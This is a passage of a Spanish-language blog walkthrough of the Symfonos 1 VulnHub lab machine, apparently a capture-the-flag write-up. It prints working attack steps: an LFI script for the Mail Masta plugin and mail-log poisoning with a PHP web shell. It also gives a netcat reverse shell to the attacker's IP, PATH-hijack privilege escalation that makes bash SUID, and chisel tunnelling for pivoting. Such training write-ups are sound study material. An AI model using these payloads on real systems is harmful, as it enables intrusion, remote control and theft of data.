+                     data-src="/2024/12/04/Symfonos%201%20y%202/searchsploit_mail_masta.png"
+                      class="" title="Buscamos en searchsploit el plugin mail masta."
+                >
+
+<p>Revisamos el txt <code>searchsploit -x 40290.txt</code> y encontramos la ruta vulnerable al LFI -&gt; &#x2F;wp-content&#x2F;plugins&#x2F;mail-masta&#x2F;inc&#x2F;campaign&#x2F;count_of_send.php?pl&#x3D;&#x2F;etc&#x2F;passwd</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/prueba_del_lfi_mail_masta.png"
+                      class="" title="Probamos el lfi."
+                >
+
+<p>Y efectivamente, logramos el LFI.</p>
+<h3 id="Script-en-bash-para-realizar-el-LFI-desde-consola"><a href="#Script-en-bash-para-realizar-el-LFI-desde-consola" class="headerlink" title="Script en bash para realizar el LFI desde consola"></a>Script en bash para realizar el LFI desde consola</h3><p>¡Genial!, hemos comprobado que podemos leer archivos, por lo que es más cómodo creándonos un script en bash para trabajar de manera más cómoda:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">check_dependencies</span></span>()&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;[+] Checking... [+]&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Check if gum is installed.</span></span><br><span class="line">	gum -h &amp;&gt;/dev/null</span><br><span class="line">	<span class="keyword">if</span> [[ $? -ne 0 ]]; <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">exit</span> 1</span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># For use the function in subshells(in gum)</span></span><br><span class="line"><span class="built_in">export</span> -f check_dependencies</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check dependices</span></span><br><span class="line">gum spin --spinner dot --title <span class="string">&quot;Checking dependencies..&quot;</span> -- bash -c <span class="string">&quot;check_dependencies&quot;</span> </span><br><span class="line"></span><br><span class="line">exit_code=$?</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$exit_code</span> -ne 0 ]]; <span class="keyword">then</span></span><br><span class="line">	<span class="keyword">if</span> [[ <span class="variable">$exit_code</span> -eq 1 ]]; <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">read</span> -p <span class="string">&quot;[*] Gum is not installed, do you want to install(y/n)?&quot;</span> option</span><br><span class="line">		<span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$option</span>&quot;</span> != <span class="string">&quot;y&quot;</span> &amp;&amp; <span class="string">&quot;<span class="variable">$option</span>&quot;</span> != <span class="string">&quot;Y&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">echo</span> -e <span class="string">&quot;\nSee you soon:)&quot;</span></span><br><span class="line">			<span class="built_in">exit</span> 2</span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line">	os_install_dependencies</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">os_install_dependencies</span></span>()&#123;</span><br><span class="line">	type_os=$(<span class="built_in">cat</span> /etc/os-release | <span class="built_in">head</span> -n 1 | grep -oP <span class="string">&quot;\&quot;.*?\&quot;&quot;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&quot;<span class="variable">$type_os</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">		<span class="string">&quot;Arch Linux&quot;</span>)</span><br><span class="line">			<span class="built_in">sudo</span> pacman -S gum</span><br><span class="line">			;;</span><br><span class="line">		<span class="string">&quot;Kali GNU/Linux&quot;</span>)</span><br><span class="line">			<span class="built_in">sudo</span> apt install gum</span><br><span class="line">			;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">esac</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start program</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">help_panel</span></span>()&#123;</span><br><span class="line">	gum style \</span><br><span class="line">        	--foreground 212 --border-foreground 212 --border double \</span><br><span class="line">        	--align center --width 50 --margin <span class="string">&quot;1 2&quot;</span> --padding <span class="string">&quot;2 4&quot;</span> \</span><br><span class="line">        	<span class="string">&#x27;Help Panel :o&#x27;</span> <span class="string">&#x27; ---------------&#x27;</span> <span class="string">&#x27; -h -&gt; Help Panel&#x27;</span> <span class="string">&#x27; -u -&gt; Indicate the URL, ex:&#x27;</span> <span class="string">&#x27;http:/example.com/file.php?=LFI&#x27;</span>	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">lfi</span></span>()&#123;</span><br><span class="line">	url=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line">	exit_order=<span class="string">&quot;qa!&quot;</span></span><br><span class="line">	<span class="built_in">exit</span>=0</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Jump line</span></span><br><span class="line">	<span class="built_in">echo</span></span><br><span class="line">	<span class="keyword">while</span> [[ <span class="variable">$exit</span> -ne 1 ]]; <span class="keyword">do</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment"># Indicate the file</span></span><br><span class="line">		gum input --placeholder <span class="string">&quot;/etc/passwd or qa! to exit&quot;</span> &gt; .file.tmp</span><br><span class="line">		file=$(<span class="built_in">cat</span> .file.tmp)</span><br><span class="line">		<span class="built_in">shred</span> -u .file.tmp</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$file</span>&quot;</span> != <span class="string">&quot;<span class="variable">$exit_order</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">			full_url=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$url</span>&quot;</span> | sed -e <span class="string">&quot;s|LFI|<span class="variable">$file</span>|g&quot;</span>)</span><br><span class="line">	</span><br><span class="line">			curl -s -X GET <span class="string">&quot;<span class="variable">$full_url</span>&quot;</span> -o .data.tmp</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> [[ -s .data.tmp ]]; <span class="keyword">then</span></span><br><span class="line">				gum pager &lt; .data.tmp</span><br><span class="line">				<span class="built_in">shred</span> -u .data.tmp</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				gum <span class="built_in">log</span> --structured --level error <span class="string">&quot;File not found.&quot;</span> name <span class="string">&quot;<span class="variable">$file</span>&quot;</span></span><br><span class="line">			<span class="keyword">fi</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">exit</span>=1</span><br><span class="line">		<span class="keyword">fi</span>	</span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Menu</span></span><br><span class="line">help_panel_shof=<span class="literal">false</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> <span class="string">&quot;hu:&quot;</span> opt; <span class="keyword">do</span></span><br><span class="line">	<span class="keyword">case</span> <span class="variable">$opt</span> <span class="keyword">in</span></span><br><span class="line">		u) lfi <span class="variable">$OPTARG</span> ;;</span><br><span class="line">		h) help_panel ;;</span><br><span class="line">		?) help_panel ;;</span><br><span class="line">	<span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check if first argument was usage, if not keep be 1(when execute the program without switches.)</span></span><br><span class="line"> <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$OPTIND</span>&quot;</span> -eq 1 ]]; <span class="keyword">then</span></span><br><span class="line">	help_panel</span><br><span class="line">	<span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/lfi_script.gif"
+                      class="" title="Funcionamiento del script"
+                >
+
+<p>No es el mejor script, pero funciona, ya os dejo a vostros restructurarlo y mejorarlo.</p>
+<h2 id="LFI-to-RCE-Log-poisoning"><a href="#LFI-to-RCE-Log-poisoning" class="headerlink" title="LFI to RCE. Log poisoning."></a>LFI to RCE. Log poisoning.</h2><p>Primero de todo, en el &#x2F;etc&#x2F;passwd podemos ver que usiarios disponen de una shell asignada, en este caso nos aparece el usuario root y <strong>helios</strong>.<br>Hemos visto que la máquina tiene el ssh abierto.<br>¿Y sí el usuario helios dispone de una key para conectarse?</p>
+<h3 id="Intento-de-visualizacion-de-clave-privada-ssh-de-helios"><a href="#Intento-de-visualizacion-de-clave-privada-ssh-de-helios" class="headerlink" title="Intento de visualización de clave privada ssh de helios"></a>Intento de visualización de clave privada ssh de helios</h3><p>Ver la clave privada de helios</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">/home/helios/.ssh/id_rsa</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Listar-procesos-en-ejecuccion"><a href="#Listar-procesos-en-ejecuccion" class="headerlink" title="Listar procesos en ejecucción"></a>Listar procesos en ejecucción</h3><p>Podemos intentar listas procesos desde el <strong>&#x2F;proc&#x2F;schedstat</strong></p>
+<p>No nos sale nada de información útil…</p>
+<p>Puedes probar con <strong>&#x2F;proc&#x2F;scheddebug</strong>, pero tampoco encuentra nada.</p>
+<h3 id="Apache-ssh-mail-Log-poisoning"><a href="#Apache-ssh-mail-Log-poisoning" class="headerlink" title="Apache, ssh, mail Log poisoning"></a>Apache, ssh, mail Log poisoning</h3><p>Comprobamos si los logs están disponibles, comprobando si podemos ver algunas de las siguientes rutas(por defecto):</p>
+<ul>
+<li>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log (apache)</li>
+<li>&#x2F;var&#x2F;log&#x2F;auth.log (ssh)</li>
+<li>&#x2F;var&#x2F;mail&#x2F;helios (smtp)</li>
+</ul>
+<p>Este último archivo si lo podemos ver:</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/mail_log_helios.png"
+                      class="" title="Log smtp de helios"
+                >
+
+<p>Genial!, podemos aprovechar que estamos en una ruta donde se esta ejecutando un código .php(count_of_send.php) para intentar mandar código php y que se interprete.</p>
+<p>¿Cómo podemos generar logs en dicho fichero?</p>
+<p>Podemos enviar un mail con <strong>telnet</strong> aunque también lo puedes hacer con netcat:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Nos conectamos a la máquina por el puerto 25</span></span><br><span class="line">telnet 192.168.1.178 25</span><br><span class="line"></span><br><span class="line"><span class="comment"># Podemos comprobar si no require autenticación y podemos enviar directamente un correo:</span></span><br><span class="line"></span><br><span class="line">MAIL FROM: sergiky</span><br><span class="line">RCPT TO: helios</span><br><span class="line">DATA</span><br><span class="line">&lt;?php system(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); ?&gt;</span><br><span class="line">.</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/send_mail.png"
+                      class="" title="Correo enviado usando telnet."
+                >
+
+<p>Comprobamos el fichero de log:</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/comprobacion_correo_enviado_log.png"
+                      class="" title="Entrada en el log del correo mandado."
+                >
+
+<p>Vemos que no aparece el contenido, ¿lo habrá interpretado?</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">curl -s -X GET <span class="string">&#x27;http://192.168.1.178/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;cmd=id&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/lfi_rce_exitoso.png"
+                      class="" title="Comprobación del RCE"
+                >
+
+<h3 id="Conectarse-con-netcat"><a href="#Conectarse-con-netcat" class="headerlink" title="Conectarse con netcat"></a>Conectarse con netcat</h3><p>Vamos a ganar acceso al equipo conectándonos con netcat, para ellos podemos comprobar que netcat esta instalado, para debemos de poner <strong>which+nc</strong>, recuerda URL encodearlo para que funciona(en este caso solo el espacio).</p>
+<p>Vemos que sí, pues podemos lanzar una shell hacía nuestro equipo de la siguiente manera:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Nos ponemos en escucha desde nuestro equipo(en otra consola):</span></span><br><span class="line">nc -nlvp 443</span><br><span class="line"></span><br><span class="line"><span class="comment"># Comando para mandar la shell desde la víctima a nuestro equipo:</span></span><br><span class="line">curl -s -X GET <span class="string">&#x27;http://192.168.1.178/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;cmd=nc+-e+/bin/bash+192.168.1.160+443&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/reverse_shell_con_nc.png"
+                      class="" title="Reverse shell con netcat."
+                >
+
+<p>En el último comando(hostname -I) podéis apreciar que hay dos tarjetas de red verdad?…:)</p>
+<h3 id="Tratamiento-de-la-TTY"><a href="#Tratamiento-de-la-TTY" class="headerlink" title="Tratamiento de la TTY"></a>Tratamiento de la TTY</h3><p>Pero vemos que esta rara, no parece una terminal a la que estamos acostumbrados.</p>
+<p>Para ello nos podemos lanzar una pseudoconsola, simulamos una nueva sesión de una bash sin dejar el registro predeterminado que deja script porque lo estamos dirigendo al &#x2F;dev&#x2F;null:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">script /dev/null -c bash</span><br></pre></td></tr></table></figure></div>
+
+<p>No pasa nada si veis el prompt raro, esto es porque<br>las proporciones no son las adecuadas con las nuestras.</p>
+<p>A continuación realizamos un <strong>ctrl+z</strong>.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">reset xterm</span><br></pre></td></tr></table></figure></div>
+<p>Ahora puedes realizar ctrl+c(antes se te salia de laconsola), pero no podemos hacer ctr+l para limpiar la pantalla, para eso utilizamos:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> TERM=xterm</span><br></pre></td></tr></table></figure></div>
+
+<p>Para adecuar las proporciones de la nuevas terminal, debemos obtener las proporciones de una terminal nuestra identica de tamaño y poner el siguiente comando:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">stty</span> size</span><br></pre></td></tr></table></figure></div>
+
+<p>Los resultados obtenimos los vamos a introducir a la máquina víctima:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">stty</span> rows 20 columns 84</span><br></pre></td></tr></table></figure></div>
+
+<p>Ahora veremos que se ha corregido el prompt y podemos hacer un nano para ver que las dimensiones son correctas.</p>
+<h1 id="Escalada-de-privilegios"><a href="#Escalada-de-privilegios" class="headerlink" title="Escalada de privilegios"></a>Escalada de privilegios</h1><p>Una vez aquí antes de raelizar la escalada, podemos ver contra que sistema operativo estamos, para ello utilizamos el comando <strong>lsb_release -a</strong> y podemos apreciar que es un <strong>stretch</strong> como vimos anteriormente el codename</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/lsb_release_symfonos1.png"
+                      class="" title="lsb_release sobre Symfonos1"
+                >
+
+<p>Utilizamos el comando <strong>id</strong> y vemos que no hay ningún grupo interesante, buscamos por archivos con privilegios <strong>SUID</strong>(Nos permite ejecutar un archivo como si del propietario tratarse, preferiblementpreferiblementestos casos):</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -user root 2&gt;/dev/null</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/buscar_privilegios_suid.png"
+                      class="" title="Buscamos por archivos con privilegios SUID"
+                >
+
+<p>Si miramos con file lo que es, vemos que es un binario compilado de 64 bits para Linux.</p>
+<p>Si probáis a ejecutarlo, veréis que os saldrá un output similar al del comando <strong>curl</strong>, si miramos con con <strong>strings</strong> para ver los caracteres legibles y usando less para empezar desde arriba:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">strings /opt/statuscheck | less</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/strings_sobre_check_status_symfonos1.png"
+                      class="" title="Strings sobre el binario"
+                >
+
+<p>¿Qué podemos intuir aquí?<br>Que <strong>no se están ejecutando rutas absolutas(&#x2F;usr&#x2F;bin&#x2F;curl)</strong>, al cometer este fallo podemos realizar <strong>path hijacking</strong>, sucedería lo mismo si estuvieramos importando librerías de algún sitio sin usar rutas absolutas, Library Hijacking.</p>
+<h2 id="Path-Hijacking"><a href="#Path-Hijacking" class="headerlink" title="Path Hijacking"></a>Path Hijacking</h2><p>Esta técnica aprovecha el uso de ruta relativa en lugar de absoluta, cuando no explicas donde está situado dicho binario, automáticamente, empieza a recorrer el PATH(echo $PATH), hasta que encuentra el binario en alguna de las rutas indicadas, en este caso, curl estaría en &#x2F;usr&#x2F;bin&#x2F;.</p>
+<p>Podemos aprovecharnos de esto modificando el PATH y añadiendo una ruta <strong>antes</strong> de la mencionada, así se ejecutaría el programa que se llame curl(<strong>que vamos a crear nosotros</strong>) en la <strong>nueva ruta que añadamos</strong>. Y si recordamos lo que he comentado anteriormente, este archivo es ejecutado como root(al igual que curl que está dentro de él).</p>
+<p>Vamos a crear el archivo curl, en este caso me voy a ir al directorio <strong>&#x2F;dev&#x2F;shm&#x2F;</strong> que es el útilizado para la memoria RAM, son datos temporales(cuando se reinicie la máquina se borran) y de gran velocidad.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Creamos un fichero llamado curl</span></span><br><span class="line"><span class="built_in">touch</span> curl</span><br><span class="line"></span><br><span class="line"><span class="comment"># Le asignamos permisos de ejecucción</span></span><br><span class="line"><span class="built_in">chmod</span> +x curl</span><br><span class="line"></span><br><span class="line"><span class="comment"># Vamos a modificar los privilegios de la bash del sistema para darle permisos SUID</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Abrimos el archivo y ponemos lo siguiente(recuerda que esto se ejecutará con el usuario root)</span></span><br><span class="line"><span class="built_in">chmod</span> u+s /bin/bash</span><br></pre></td></tr></table></figure></div>
+
+<p>Al asignarle privilegios SUID a la bash todo el usuario que invoque una nueva bash esta será iniciada por el usuario root y se la devolverá con dicho usuario.</p>
+<p>Ahora vamos a modificar el path para que encuentre nuestro archivo como antes hemos comentado:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Puedes poner el directorio local (.) o /dev/shm o donde estes</span></span><br><span class="line"><span class="built_in">export</span> PATH = .:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/modificando_el_path_symfonos1.png"
+                      class="" title="Modificando el PATH"
+                >
+
+<p>Ejecutamos el programa: &#x2F;opt&#x2F;statuscheck</p>
+<p>¿Porque no se ve nada de output?<br>Porque el curl ha sido secuestrado y se utiliza el curl creado por nosotros.</p>
+<p>Checkar que la bash se le ha asignado permisos, deberías apreciar una <strong>s</strong></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /bin/bash</span><br></pre></td></tr></table></figure></div>
+<p>Y utilizamos el siguiente comando para elevar los privilegios.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li><strong>-p</strong>: -p de privilageeeee.</li>
+</ul>
+<p>Fijate que no hace falta poner sudo delante porque la bash es SUID.</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/escalada_exitosa_root_symfonos1.png"
+                      class="" title="Entramos como el usuario root"
+                >
+
+<p>Puedes ver la flag de root, aunque en Vulnhub no sirve para nada:</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/flag_root_symfonos1.png"
+                      class="" title="Flag de root"
+                >
+
+<h1 id="Empezamos-el-pivoting"><a href="#Empezamos-el-pivoting" class="headerlink" title="Empezamos el pivoting"></a>Empezamos el pivoting</h1><p>Para hacer el pivoting no hacía falta disponer de root, pero marcamos como completa la máquina.</p>
+<h2 id="Host-discovery"><a href="#Host-discovery" class="headerlink" title="Host discovery"></a>Host discovery</h2><p>Vamos a crear un archivo bash ejecutable(darle permisos de ejecucción).</p>
+<ul>
+<li><strong>&#x2F;dev&#x2F;shm</strong>: Archivos almacenados en RAM, son más rápidos, pero se borran al reiniciar el archivo.</li>
+</ul>
+<p>En este caso lo voy a llamar hostDiscovery.sh y va a tener el siguiente contenido:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">ctrl_c</span></span>()&#123;</span><br><span class="line">	<span class="built_in">echo</span> -e <span class="string">&quot;\n\n[!] Saliendo...\n&quot;</span></span><br><span class="line">	tput cnorm</span><br><span class="line">	<span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">trap</span> ctrl_c INT</span><br><span class="line"></span><br><span class="line">tput civis</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 254); <span class="keyword">do</span></span><br><span class="line">	<span class="built_in">timeout</span> 1 bash -c <span class="string">&quot;ping -c 1 192.168.100.<span class="variable">$i</span>&quot;</span> &amp;&gt;/dev/null &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;[+] El host 192.168.100.<span class="variable">$i</span> esta activo&quot;</span> &amp;</span><br><span class="line"><span class="keyword">done</span>; <span class="built_in">wait</span></span><br><span class="line"></span><br><span class="line">tput cnorm</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/host_discovery_result.png"
+                      class="" title="Host descubiertos en la red inaccesible."
+                >
+
+<p>Podeis apreceiar que aparecen muchas IP, pero estás son generadas por la forma que se crea el adaptador NAT en virtualbox, nuestra ip es la 192.168.100.4 y otra máquina que está conectada es la <strong>192.168.100.5</strong>.</p>
+<p>Con los siguientes comandos podemos descubrir para que son algunas ips generadas con virtualbox:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">VBoxManage list natnetworks</span><br><span class="line">VBoxManage list dhcpservers</span><br></pre></td></tr></table></figure></div>
+
+<p>192.168.100.3 -&gt; Servidor DHCP.<br>192.168.100.2 -&gt; No aparece, pero puede que sea el name server.<br>192.168.100.1 -&gt; Default gateway. Se conecta con nuestro equipo host y manda el tráfico por internet.</p>
+<p>Un truco, si en la máquina Symfonos 2 no os muestra la ip, os aparece localhost(127.0.0.1) a mi me ha funcionado apagar las dos máquinas y encender primero Symfonos2 y luego Symfonos1.</p>
+<h3 id="Port-scanning"><a href="#Port-scanning" class="headerlink" title="Port scanning"></a>Port scanning</h3><p>Puedes subir un binario compilado de nmap o te puedes crear tu propia utilidad:</p>
+<p>Os recomiendo copiaros hostDiscovery.sh y llamarlo <strong>portDiscovery.sh</strong> ya que vamos a reutilizar parte del script.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">ctrl_c</span></span>()&#123;</span><br><span class="line">	<span class="built_in">echo</span> -e <span class="string">&quot;\n\n[!] Saliendo...\n&quot;</span></span><br><span class="line">	tput cnorm</span><br><span class="line">	<span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">trap</span> ctrl_c INT</span><br><span class="line"></span><br><span class="line">tput civis</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 65535); <span class="keyword">do</span></span><br><span class="line">	<span class="built_in">timeout</span> 1 bash -c <span class="string">&quot;echo &#x27;&#x27; &gt; /dev/tcp/192.168.100.5/<span class="variable">$port</span> 2&gt;/dev/null &amp;&amp; echo &#x27;[+] Puerto <span class="variable">$port</span> abierto&#x27;&quot;</span> &amp;</span><br><span class="line"><span class="keyword">done</span>; <span class="built_in">wait</span></span><br><span class="line"></span><br><span class="line">tput cnorm</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>echo ‘’ &#x2F;dev&#x2F;tcp&#x2F;192.168.100.5&#x2F;$port</strong>: Intenta establecer una conexión mediante TCP al host y puerto indicado.</li>
+<li><strong>2&gt;&#x2F;dev&#x2F;null</strong>: Al establecer la conexión no emite ningún tipo de output así que solo con no mostrar los errores vale.</li>
+</ul>
+<p>El programa puede tardar un rato en ejecutarse, si no os funciona ctrl+c podéis utilizar ctrl+z y en caso de no ver el cursor poner tput cnorm como en el script.</p>
+<h2 id="Tunel-proxy-con-Chisel"><a href="#Tunel-proxy-con-Chisel" class="headerlink" title="Túnel proxy con Chisel."></a>Túnel proxy con Chisel.</h2><p>Vamos a montarnos un túnel con Chisel para poder tener accesible los puertos de la máquina víctima.</p>
+<p>El primer paso es descargarnos <a class="link"   href="https://github.com/jpillora/chisel" >Chisel<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, recomiendo ir a las releases y descargar la última versión disponible, si utilizas arch puedes instalarlo mediante AUR(chisel-jpillora) o añadiendo los repositorios de black arch y descargarlo con pacman.</p>
+<p>En caso de descargar la última release desde github o al hacer la copia de &#x2F;usr&#x2F;bin&#x2F;chisel, si quieres reducir el peso del ejecutable ya que está en go, puedes utilizar los siguientes comandos:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Para ver el peso del archivo</span></span><br><span class="line"><span class="built_in">du</span> -hc chisel</span><br><span class="line"></span><br><span class="line"><span class="comment"># Para disminuir el peso(Así tardará menos en subirse a la máquina víctima)</span></span><br><span class="line">upx chisel</span><br></pre></td></tr></table></figure></div>
+
+<p>Para pasar el archivo nos creamos un servidor web en python en el directorio donde está chisel(por defecto ya tiene directory listening activado y podemos ver los activos y descargarnoslos-</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure></div>
+
+<p>Para descargarlo en la víctima sería con un simple wget:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.1.160/chisel</span><br></pre></td></tr></table></figure></div>
+
+<p>Le aplicamos permisos de ejecucción:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x chisel</span><br></pre></td></tr></table></figure></div>
+
+<p>Bien, ya disponemos del chisel en las dos máquinas pues vamos a conectar las máquinas, primero empezamos con la máquina atacante(si tu máquina melón):</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">chisel server --reverse -p 1234</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li><p><strong>server</strong>: Configurar Chisel en modo servidor, esperando conexiones de clientes.</p>
+</li>
+<li><p><strong>–reverse</strong>: Configuración para túneles reversos. El cliente inicia la conexión en lugar del servidor y una vez conectado el servidor <strong>recibe</strong> conexiones del cliente para <strong>redirigir</strong> el tráfico.</p>
+</li>
+<li><p><strong>-p 1234</strong>: Indicas el puerto de conexión.</p>
+</li>
+</ul>
+<p>Tu puedes llevarte puerto por puerto de la máquina que no ves a tu equipo:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./chisel client 192.168.1.160:1234 R:80:192.168.100.5</span><br></pre></td></tr></table></figure></div>
+
+<p>Pero no esto no nos interesa porque es muy tedioso, así que vamos a utilizar la siguiente forma:</p>
